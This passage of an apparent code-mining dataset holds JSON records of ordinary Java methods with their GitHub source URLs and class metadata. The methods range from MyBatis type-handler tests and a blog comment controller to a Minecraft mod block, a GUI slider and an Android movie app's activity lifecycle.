"https://raw.githubusercontent.com/bruinli28/stockmarket/master/cloud-zuul-service/src/main/java/com/iiht/stock/zuul/util/UserContextFilter.java", "stars": "2", "class": {"name": "UserContextFilter", "extends": null, "implements": ["Filter"], "modifiers": ["public"]}}, {"method_name": "init", "params": ["FilterConfig"], "throws": ["ServletException"], "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void init(FilterConfig filterConfig) throws ServletException {\t}", "url": "https://raw.githubusercontent.com/bruinli28/stockmarket/master/cloud-zuul-service/src/main/java/com/iiht/stock/zuul/util/UserContextFilter.java", "stars": "2", "class": {"name": "UserContextFilter", "extends": null, "implements": ["Filter"], "modifiers": ["public"]}}, {"method_name": "destroy", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void destroy() {\t}", "url": "https://raw.githubusercontent.com/bruinli28/stockmarket/master/cloud-zuul-service/src/main/java/com/iiht/stock/zuul/util/UserContextFilter.java", "stars": "2", "class": {"name": "UserContextFilter", "extends": null, "implements": ["Filter"], "modifiers": ["public"]}}, {"method_name": "shouldSetParameter", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void shouldSetParameter() throws Exception {    TYPE_HANDLER.setParameter(ps, 1, (byte) 100, null);    verify(ps).setByte(1, (byte) 100);  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/type/ByteTypeHandlerTest.java", "stars": "15", "class": {"name": "ByteTypeHandlerTest", "extends": "BaseTypeHandlerTest", "implements": null, "modifiers": []}}, {"method_name": "shouldGetResultFromResultSetByName", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void shouldGetResultFromResultSetByName() throws Exception {    when(rs.getByte(\"column\")).thenReturn((byte) 100);    assertEquals(Byte.valueOf((byte) 100), TYPE_HANDLER.getResult(rs, \"column\"));    when(rs.getByte(\"column\")).thenReturn((byte) 0);    assertEquals(Byte.valueOf((byte) 0), TYPE_HANDLER.getResult(rs, \"column\"));  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/type/ByteTypeHandlerTest.java", "stars": "15", "class": {"name": "ByteTypeHandlerTest", "extends": "BaseTypeHandlerTest", "implements": null, "modifiers": []}}, {"method_name": "shouldGetResultNullFromResultSetByName", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void shouldGetResultNullFromResultSetByName() throws Exception {    when(rs.getByte(\"column\")).thenReturn((byte) 0);    when(rs.wasNull()).thenReturn(true);    assertNull(TYPE_HANDLER.getResult(rs, \"column\"));  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/type/ByteTypeHandlerTest.java", "stars": "15", "class": {"name": "ByteTypeHandlerTest", "extends": "BaseTypeHandlerTest", "implements": null, "modifiers": []}}, {"method_name": "shouldGetResultFromResultSetByPosition", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void shouldGetResultFromResultSetByPosition() throws Exception {    when(rs.getByte(1)).thenReturn((byte) 100);    assertEquals(Byte.valueOf((byte) 100), TYPE_HANDLER.getResult(rs, 1));    when(rs.getByte(1)).thenReturn((byte) 0);    assertEquals(Byte.valueOf((byte) 0), TYPE_HANDLER.getResult(rs, 1));  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/type/ByteTypeHandlerTest.java", "stars": "15", "class": {"name": "ByteTypeHandlerTest", "extends": "BaseTypeHandlerTest", "implements": null, "modifiers": []}}, {"method_name": "shouldGetResultNullFromResultSetByPosition", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void shouldGetResultNullFromResultSetByPosition() throws Exception {    when(rs.getByte(1)).thenReturn((byte) 0);    when(rs.wasNull()).thenReturn(true);    assertNull(TYPE_HANDLER.getResult(rs, 1));  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/type/ByteTypeHandlerTest.java", "stars": "15", "class": {"name": "ByteTypeHandlerTest", "extends": "BaseTypeHandlerTest", "implements": null, "modifiers": []}}, {"method_name": "shouldGetResultFromCallableStatement", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void shouldGetResultFromCallableStatement() throws Exception {    when(cs.getByte(1)).thenReturn((byte) 100);    assertEquals(Byte.valueOf((byte) 100), TYPE_HANDLER.getResult(cs, 1));    when(cs.getByte(1)).thenReturn((byte) 0);    assertEquals(Byte.valueOf((byte) 0), TYPE_HANDLER.getResult(cs, 1));  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/type/ByteTypeHandlerTest.java", "stars": "15", "class": {"name": "ByteTypeHandlerTest", "extends": "BaseTypeHandlerTest", "implements": null, "modifiers": []}}, {"method_name": "shouldGetResultNullFromCallableStatement", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void shouldGetResultNullFromCallableStatement() throws Exception {    when(cs.getByte(1)).thenReturn((byte) 0);    when(cs.wasNull()).thenReturn(true);    assertNull(TYPE_HANDLER.getResult(cs, 1));  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/type/ByteTypeHandlerTest.java", "stars": "15", "class": {"name": "ByteTypeHandlerTest", "extends": "BaseTypeHandlerTest", "implements": null, "modifiers": []}}, {"method_name": "format", "params": ["LoggingEvent"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String format(final LoggingEvent event) {    if (event.getMessage() instanceof String) {      return super.format(appendStackTraceToEvent(event));    }    return super.format(event);  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/utils/PatternLayoutEscaped.java", "stars": "18", "class": {"name": "PatternLayoutEscaped", "extends": "PatternLayout", "implements": null, "modifiers": ["public"]}}, {"method_name": "appendStackTraceToEvent", "params": ["LoggingEvent"], "throws": null, "modifiers": ["private"], "return_type": "LoggingEvent", "snippet": "  private LoggingEvent appendStackTraceToEvent(final LoggingEvent event) {    String message = event.getMessage().toString();    // If there is a stack trace available, print it out    if (event.getThrowableInformation() != null) {      final String[] s = event.getThrowableStrRep();      for (final String line : s) {        message += \"\\n\" + line;      }    }    message = message        .replace(\"\\\\\", \"\\\\\\\\\")        .replace(\"\\n\", \"\\\\n\")        .replace(\"\\\"\", \"\\\\\\\"\")        .replace(\"\\t\", \"\\\\t\");    final Throwable throwable = event.getThrowableInformation() == null ? null        : event.getThrowableInformation().getThrowable();    return new LoggingEvent(event.getFQNOfLoggerClass(),        event.getLogger(),        event.getTimeStamp(),        event.getLevel(),        message,        throwable);  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/utils/PatternLayoutEscaped.java", "stars": "18", "class": {"name": "PatternLayoutEscaped", "extends": "PatternLayout", "implements": null, "modifiers": ["public"]}}, {"method_name": "aDistributionMasqueDatabase", "params": ["String", "TypeMasque"], "throws": null, "modifiers": ["public", "static"], "return_type": "DistributionMasqueDatabase", "snippet": "    public static DistributionMasqueDatabase aDistributionMasqueDatabase(String demandeur, TypeMasque typeMasque) {        return DistributionMasqueDatabase.builder()                .demandeur(demandeur)                .dateDistribution(LocalDateTime.now(ClockFixture.clock()))                .nbPersonnes(2)                .typeMasque(typeMasque.name())                .nbMasques(5)                .modeSaisie(SCAN.name())                .codePostal(\"75001\")                .typeRemettant(Mairie.name())                .build();    }", "url": "https://raw.githubusercontent.com/LAB-MI/remise-masques-covid-19/master/src/test/java/fr/gouv/interieur/dmgp/remettant/infrastructure/fixtures/DistributionMasqueDatabaseFixture.java", "stars": "5", "class": {"name": "DistributionMasqueDatabaseFixture", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "aDistributionMasqueDatabase", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "DistributionMasqueDatabase", "snippet": "    public static DistributionMasqueDatabase aDistributionMasqueDatabase(String demandeur) {        return aDistributionMasqueDatabase(demandeur, ADULTE_REUTILISABLE);    }", "url": "https://raw.githubusercontent.com/LAB-MI/remise-masques-covid-19/master/src/test/java/fr/gouv/interieur/dmgp/remettant/infrastructure/fixtures/DistributionMasqueDatabaseFixture.java", "stars": "5", "class": {"name": "DistributionMasqueDatabaseFixture", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "aDistributionMasqueDatabase", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "DistributionMasqueDatabase", "snippet": "    public static DistributionMasqueDatabase aDistributionMasqueDatabase() {        return aDistributionMasqueDatabase(\"08c71b89ac55b6826a2daa9fe89edea26de\");    }", "url": "https://raw.githubusercontent.com/LAB-MI/remise-masques-covid-19/master/src/test/java/fr/gouv/interieur/dmgp/remettant/infrastructure/fixtures/DistributionMasqueDatabaseFixture.java", "stars": "5", "class": {"name": "DistributionMasqueDatabaseFixture", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "index", "params": ["int", "int", "HttpServletRequest"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String index(            @ApiParam(name = \"page\", value = \"\u9875\u6570\", required = false)            @RequestParam(name = \"page\", required = false, defaultValue = \"1\")            int page,            @ApiParam(name = \"limit\", value = \"\u6bcf\u9875\u6761\u6570\", required = false)            @RequestParam(name = \"limit\", required = false, defaultValue = \"15\")            int limit,            HttpServletRequest request    ){        UserDomain user = this.user(request);        PageInfo<CommentDomain> comments = commentService.getCommentsByCond(new CommentCond(), page, limit);        request.setAttribute(\"comments\", comments);        return \"admin/comment_list\";    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/controller/CommentController.java", "stars": "2", "class": {"name": "CommentController", "extends": "BaseController", "implements": null, "modifiers": ["public"]}}, {"method_name": "deleteComment", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "APIResponse", "snippet": "    public APIResponse deleteComment(            @ApiParam(name = \"coid\", value = \"\u8bc4\u8bba\u7f16\u53f7\", required = true)            @RequestParam(name = \"coid\", required = true)            Integer coid    ){        try {            CommentDomain comment = commentService.getCommentById(coid);            if (null == comment)                throw BusinessException.withErrorCode(ErrorConstant.Comment.COMMENT_NOT_EXIST);            commentService.deleteComment(coid);        } catch (Exception e) {            e.printStackTrace();            LOGGER.error(e.getMessage());            return APIResponse.fail(e.getMessage());        }        return APIResponse.success();    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/controller/CommentController.java", "stars": "2", "class": {"name": "CommentController", "extends": "BaseController", "implements": null, "modifiers": ["public"]}}, {"method_name": "changeStatus", "params": ["Integer", "String"], "throws": null, "modifiers": ["public"], "return_type": "APIResponse", "snippet": "    public APIResponse changeStatus(            @ApiParam(name = \"coid\", value = \"\u8bc4\u8bba\u4e3b\u952e\", required = true)            @RequestParam(name = \"coid\", required = true)            Integer coid,            @ApiParam(name = \"status\", value = \"\u72b6\u6001\", required = true)            @RequestParam(name = \"status\", required = true)            String status    ){        try {            CommentDomain comment = commentService.getCommentById(coid);            if (null != comment){                commentService.updateCommentStatus(coid, status);            }else{                return APIResponse.fail(\"\u5220\u9664\u5931\u8d25\");            }        } catch (Exception e) {            e.printStackTrace();            LOGGER.error(e.getMessage());            return APIResponse.fail(e.getMessage());        }        return APIResponse.success();    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/controller/CommentController.java", "stars": "2", "class": {"name": "CommentController", "extends": "BaseController", "implements": null, "modifiers": ["public"]}}, {"method_name": "process", "params": ["RequestEvent", "SipLayer", "ServerTransaction"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void process(RequestEvent evt, SipLayer layer, ServerTransaction transaction) {\t\t// TODO Auto-generated method stub\t\t\t}", "url": "https://raw.githubusercontent.com/swwheihei/wvp/master/src/main/java/com/genersoft/iot/vmp/gb28181/transmit/request/impl/CancelRequestProcessor.java", "stars": "29", "class": {"name": "CancelRequestProcessor", "extends": null, "implements": ["ISIPRequestProcessor"], "modifiers": ["public"]}}, {"method_name": "initElements", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void initElements() {\t\telements.blocks.add(() -> new CustomBlock());\t\telements.items\t\t\t\t.add(() -> new BlockItem(block, new Item.Properties().group(ItemGroup.BUILDING_BLOCKS)).setRegistryName(block.getRegistryName()));\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/MudBrickSlabBlock.java", "stars": "2", "class": {"name": "MudBrickSlabBlock", "extends": "EnhancedVanillaElements", "implements": null, "modifiers": ["public"]}}, {"method_name": "getDrops", "params": ["BlockState", "LootContext"], "throws": null, "modifiers": ["public"], "return_type": "List<ItemStack>", "snippet": "\t\tpublic List<ItemStack> getDrops(BlockState state, LootContext.Builder builder) {\t\t\tList<ItemStack> dropsOriginal = super.getDrops(state, builder);\t\t\tif (!dropsOriginal.isEmpty())\t\t\t\treturn dropsOriginal;\t\t\treturn Collections.singletonList(new ItemStack(this, 0));\t\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/MudBrickSlabBlock.java", "stars": "2", "class": {"name": "CustomBlock", "extends": "SlabBlock", "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "setNonNullParameter", "params": ["PreparedStatement", "int", "Date", "JdbcType"], "throws": ["SQLException"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void setNonNullParameter(PreparedStatement ps, int i, Date parameter, JdbcType jdbcType)      throws SQLException {    ps.setTime(i, new Time(parameter.getTime()));  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/type/TimeOnlyTypeHandler.java", "stars": "15", "class": {"name": "TimeOnlyTypeHandler", "extends": "BaseTypeHandler", "implements": null, "modifiers": ["public"]}}, {"method_name": "getNullableResult", "params": ["ResultSet", "String"], "throws": ["SQLException"], "modifiers": ["public"], "return_type": "Date", "snippet": "  public Date getNullableResult(ResultSet rs, String columnName)      throws SQLException {    Time sqlTime = rs.getTime(columnName);    if (sqlTime != null) {      return new Date(sqlTime.getTime());    }    return null;  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/type/TimeOnlyTypeHandler.java", "stars": "15", "class": {"name": "TimeOnlyTypeHandler", "extends": "BaseTypeHandler", "implements": null, "modifiers": ["public"]}}, {"method_name": "getNullableResult", "params": ["ResultSet", "int"], "throws": ["SQLException"], "modifiers": ["public"], "return_type": "Date", "snippet": "  public Date getNullableResult(ResultSet rs, int columnIndex)      throws SQLException {    Time sqlTime = rs.getTime(columnIndex);    if (sqlTime != null) {      return new Date(sqlTime.getTime());    }    return null;  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/type/TimeOnlyTypeHandler.java", "stars": "15", "class": {"name": "TimeOnlyTypeHandler", "extends": "BaseTypeHandler", "implements": null, "modifiers": ["public"]}}, {"method_name": "getNullableResult", "params": ["CallableStatement", "int"], "throws": ["SQLException"], "modifiers": ["public"], "return_type": "Date", "snippet": "  public Date getNullableResult(CallableStatement cs, int columnIndex)      throws SQLException {    Time sqlTime = cs.getTime(columnIndex);    if (sqlTime != null) {      return new Date(sqlTime.getTime());    }    return null;  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/type/TimeOnlyTypeHandler.java", "stars": "15", "class": {"name": "TimeOnlyTypeHandler", "extends": "BaseTypeHandler", "implements": null, "modifiers": ["public"]}}, {"method_name": "shouldSetParameter", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void shouldSetParameter() throws Exception {    TYPE_HANDLER.setParameter(ps, 1, \"Hello\", null);    verify(ps).setObject(1, \"Hello\");  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/type/ObjectTypeHandlerTest.java", "stars": "15", "class": {"name": "ObjectTypeHandlerTest", "extends": "BaseTypeHandlerTest", "implements": null, "modifiers": []}}, {"method_name": "shouldGetResultFromResultSetByName", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void shouldGetResultFromResultSetByName() throws Exception {    when(rs.getObject(\"column\")).thenReturn(\"Hello\");    assertEquals(\"Hello\", TYPE_HANDLER.getResult(rs, \"column\"));  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/type/ObjectTypeHandlerTest.java", "stars": "15", "class": {"name": "ObjectTypeHandlerTest", "extends": "BaseTypeHandlerTest", "implements": null, "modifiers": []}}, {"method_name": "shouldGetResultNullFromResultSetByName", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void shouldGetResultNullFromResultSetByName() throws Exception {    when(rs.getObject(\"column\")).thenReturn(null);    assertNull(TYPE_HANDLER.getResult(rs, \"column\"));  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/type/ObjectTypeHandlerTest.java", "stars": "15", "class": {"name": "ObjectTypeHandlerTest", "extends": "BaseTypeHandlerTest", "implements": null, "modifiers": []}}, {"method_name": "shouldGetResultFromResultSetByPosition", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void shouldGetResultFromResultSetByPosition() throws Exception {    when(rs.getObject(1)).thenReturn(\"Hello\");    assertEquals(\"Hello\", TYPE_HANDLER.getResult(rs, 1));  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/type/ObjectTypeHandlerTest.java", "stars": "15", "class": {"name": "ObjectTypeHandlerTest", "extends": "BaseTypeHandlerTest", "implements": null, "modifiers": []}}, {"method_name": "shouldGetResultNullFromResultSetByPosition", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void shouldGetResultNullFromResultSetByPosition() throws Exception {    when(rs.getObject(1)).thenReturn(null);    assertNull(TYPE_HANDLER.getResult(rs, 1));  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/type/ObjectTypeHandlerTest.java", "stars": "15", "class": {"name": "ObjectTypeHandlerTest", "extends": "BaseTypeHandlerTest", "implements": null, "modifiers": []}}, {"method_name": "shouldGetResultFromCallableStatement", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void shouldGetResultFromCallableStatement() throws Exception {    when(cs.getObject(1)).thenReturn(\"Hello\");    assertEquals(\"Hello\", TYPE_HANDLER.getResult(cs, 1));  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/type/ObjectTypeHandlerTest.java", "stars": "15", "class": {"name": "ObjectTypeHandlerTest", "extends": "BaseTypeHandlerTest", "implements": null, "modifiers": []}}, {"method_name": "shouldGetResultNullFromCallableStatement", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void shouldGetResultNullFromCallableStatement() throws Exception {    when(cs.getObject(1)).thenReturn(null);    assertNull(TYPE_HANDLER.getResult(cs, 1));  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/type/ObjectTypeHandlerTest.java", "stars": "15", "class": {"name": "ObjectTypeHandlerTest", "extends": "BaseTypeHandlerTest", "implements": null, "modifiers": []}}, {"method_name": "setGUI", "params": ["IGUICallback"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setGUI(IGUICallback back) {        this.callback = back;    }", "url": "https://raw.githubusercontent.com/Prunoideae/PhasePotion/master/src/main/java/com/naive/phase/GUI/Elements/ElementSlidebar.java", "stars": "2", "class": {"name": "ElementSlidebar", "extends": "GuiElementBase", "implements": ["IGUIElement"], "modifiers": ["public"]}}, {"method_name": "render", "params": ["int", "int", "float"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void render(int x, int y, float partialTicks) {        drawRect(this.x, this.y, this.x + width, this.y + height, 0xFFFFFFFF);        drawRect((int) (this.x + width * percent), this.y, (int) (this.x + width * percent + 4), this.y + height, 0xFF000000);    }", "url": "https://raw.githubusercontent.com/Prunoideae/PhasePotion/master/src/main/java/com/naive/phase/GUI/Elements/ElementSlidebar.java", "stars": "2", "class": {"name": "ElementSlidebar", "extends": "GuiElementBase", "implements": ["IGUIElement"], "modifiers": ["public"]}}, {"method_name": "renderForeground", "params": ["int", "int", "float"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void renderForeground(int x, int y, float partialTicks) {    }", "url": "https://raw.githubusercontent.com/Prunoideae/PhasePotion/master/src/main/java/com/naive/phase/GUI/Elements/ElementSlidebar.java", "stars": "2", "class": {"name": "ElementSlidebar", "extends": "GuiElementBase", "implements": ["IGUIElement"], "modifiers": ["public"]}}, {"method_name": "onClicked", "params": ["int", "int", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onClicked(int mouseX, int mouseY, int mouseButton) {        int offset = mouseX - x;        this.percent = offset / (float) this.width;    }", "url": "https://raw.githubusercontent.com/Prunoideae/PhasePotion/master/src/main/java/com/naive/phase/GUI/Elements/ElementSlidebar.java", "stars": "2", "class": {"name": "ElementSlidebar", "extends": "GuiElementBase", "implements": ["IGUIElement"], "modifiers": ["public"]}}, {"method_name": "onClickedOutside", "params": ["int", "int", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onClickedOutside(int mouseX, int mouseY, int mouseButton) {    }", "url": "https://raw.githubusercontent.com/Prunoideae/PhasePotion/master/src/main/java/com/naive/phase/GUI/Elements/ElementSlidebar.java", "stars": "2", "class": {"name": "ElementSlidebar", "extends": "GuiElementBase", "implements": ["IGUIElement"], "modifiers": ["public"]}}, {"method_name": "onKeyInput", "params": ["char", "int"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean onKeyInput(char key, int keyCode) {        return false;    }", "url": "https://raw.githubusercontent.com/Prunoideae/PhasePotion/master/src/main/java/com/naive/phase/GUI/Elements/ElementSlidebar.java", "stars": "2", "class": {"name": "ElementSlidebar", "extends": "GuiElementBase", "implements": ["IGUIElement"], "modifiers": ["public"]}}, {"method_name": "update", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void update() {    }", "url": "https://raw.githubusercontent.com/Prunoideae/PhasePotion/master/src/main/java/com/naive/phase/GUI/Elements/ElementSlidebar.java", "stars": "2", "class": {"name": "ElementSlidebar", "extends": "GuiElementBase", "implements": ["IGUIElement"], "modifiers": ["public"]}}, {"method_name": "getID", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getID() {        return 0;    }", "url": "https://raw.githubusercontent.com/Prunoideae/PhasePotion/master/src/main/java/com/naive/phase/GUI/Elements/ElementSlidebar.java", "stars": "2", "class": {"name": "ElementSlidebar", "extends": "GuiElementBase", "implements": ["IGUIElement"], "modifiers": ["public"]}}, {"method_name": "getValue", "params": [], "throws": null, "modifiers": ["public"], "return_type": "float", "snippet": "    public float getValue() {        return (max - min) * percent + min;    }", "url": "https://raw.githubusercontent.com/Prunoideae/PhasePotion/master/src/main/java/com/naive/phase/GUI/Elements/ElementSlidebar.java", "stars": "2", "class": {"name": "ElementSlidebar", "extends": "GuiElementBase", "implements": ["IGUIElement"], "modifiers": ["public"]}}, {"method_name": "setValue", "params": ["float"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setValue(float value) {        this.percent = (value - min) / (max - min);    }", "url": "https://raw.githubusercontent.com/Prunoideae/PhasePotion/master/src/main/java/com/naive/phase/GUI/Elements/ElementSlidebar.java", "stars": "2", "class": {"name": "ElementSlidebar", "extends": "GuiElementBase", "implements": ["IGUIElement"], "modifiers": ["public"]}}, {"method_name": "onCreate", "params": ["Bundle", "int"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onCreate(Bundle savedInstanceState, int layoutId) {        super.onCreate(savedInstanceState, layoutId);        if(!VersionUtils.isUsingCorrectBuild()) {            new AlertDialog.Builder(this)                    .setMessage(butter.droid.base.R.string.wrong_abi)                    .setCancelable(false)                    .show();            updateManager.setListener(new ButterUpdateManager.Listener() {                @Override                public void updateAvailable(String updateFile) {                    Uri uri = FileProvider.getUriForFile(ButterBaseActivity.this, BuildConfig.APPLICATION_ID + \".provider\", new File(updateFile));                    Intent installIntent = new Intent(Intent.ACTION_VIEW);                    installIntent.setDataAndType(uri, ButterUpdateManager.ANDROID_PACKAGE);                    installIntent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);                    installIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);                    startActivity(installIntent);                }            });            updateManager.checkUpdatesManually();        }    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/mobile/src/main/java/butter/droid/activities/base/ButterBaseActivity.java", "stars": "4", "class": {"name": "ButterBaseActivity", "extends": "TorrentBaseActivity", "implements": ["BeamManager", "VPNManager"], "modifiers": ["public"]}}, {"method_name": "onResume", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onResume() {        String language = PrefUtils.get(this, Prefs.LOCALE, ButterApplication.getSystemLanguage());        LocaleUtils.setCurrent(this, LocaleUtils.toLocale(language));        super.onResume();        BeamManager.getInstance(this).addListener(this);    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/mobile/src/main/java/butter/droid/activities/base/ButterBaseActivity.java", "stars": "4", "class": {"name": "ButterBaseActivity", "extends": "TorrentBaseActivity", "implements": ["BeamManager", "VPNManager"], "modifiers": ["public"]}}, {"method_name": "onPause", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onPause() {        super.onPause();        BeamManager.getInstance(this).removeListener(this);    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/mobile/src/main/java/butter/droid/activities/base/ButterBaseActivity.java", "stars": "4", "class": {"name": "ButterBaseActivity", "extends": "TorrentBaseActivity", "implements": ["BeamManager", "VPNManager"], "modifiers": ["public"]}}, {"method_name": "onStop", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onStop() {        super.onStop();        if(mVPNManager != null)            mVPNManager.stop();    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/mobile/src/main/java/butter/droid/activities/base/ButterBaseActivity.java", "stars": "4", "class": {"name": "ButterBaseActivity", "extends": "TorrentBaseActivity", "implements": ["BeamManager", "VPNManager"], "modifiers": ["public"]}}, {"method_name": "onHomePressed", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onHomePressed() {        Intent upIntent = NavUtils.getParentActivityIntent(this);        if (upIntent != null && NavUtils.shouldUpRecreateTask(this, upIntent)) {            // This activity is NOT part of this app's task, so create a new task            // when navigating up, with a synthesized back stack.            TaskStackBuilder.create(this)                    // Add all of this activity's parents to the back stack                    .addNextIntentWithParentStack(upIntent)                            // Navigate up to the closest parent                    .startActivities();        } else {            finish();        }    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/mobile/src/main/java/butter/droid/activities/base/ButterBaseActivity.java", "stars": "4", "class": {"name": "ButterBaseActivity", "extends": "TorrentBaseActivity", "implements": ["BeamManager", "VPNManager"], "modifiers": ["public"]}}, {"method_name": "onCreateOptionsMenu", "params": ["Menu"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean onCreateOptionsMenu(Menu menu) {        super.onCreateOptionsMenu(menu);        getMenuInflater().inflate(R.menu.activity_base, menu);        BeamManager beamManager = BeamManager.getInstance(this);        Boolean castingVisible = mShowCasting && beamManager.hasCastDevices();        MenuItem item = menu.findItem(R.id.action_casting);        item.setVisible(castingVisible);        item.setIcon(beamManager.isConnected() ? R.drawable.ic_av_beam_connected : R.drawable.ic_av_beam_disconnected);        return true;    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/mobile/src/main/java/butter/droid/activities/base/ButterBaseActivity.java", "stars": "4", "class": {"name": "ButterBaseActivity", "extends": "TorrentBaseActivity", "implements": ["BeamManager", "VPNManager"], "modifiers": ["public"]}}, {"method_name": "onOptionsItemSelected", "params": ["MenuItem"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean onOptionsItemSelected(MenuItem item) {        switch (item.getItemId()) {            case android.R.id.home:                onHomePressed();                return true;            case R.id.action_casting:                BeamDeviceSelectorDialogFragment.show(getFragmentManager());                break;        }        return super.onOptionsItemSelected(item);    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/mobile/src/main/java/butter/droid/activities/base/ButterBaseActivity.java", "stars": "4", "class": {"name": "ButterBaseActivity", "extends": "TorrentBaseActivity", "implements": ["BeamManager", "VPNManager"], "modifiers": ["public"]}}, {"method_name": "updateBeamIcon", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void updateBeamIcon() {        supportInvalidateOptionsMenu();    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/mobile/src/main/java/butter/droid/activities/base/ButterBaseActivity.java", "stars": "4", "class": {"name": "ButterBaseActivity", "extends": "TorrentBaseActivity", "implements": ["BeamManager", "VPNManager"], "modifiers": ["public"]}}, {"method_name": 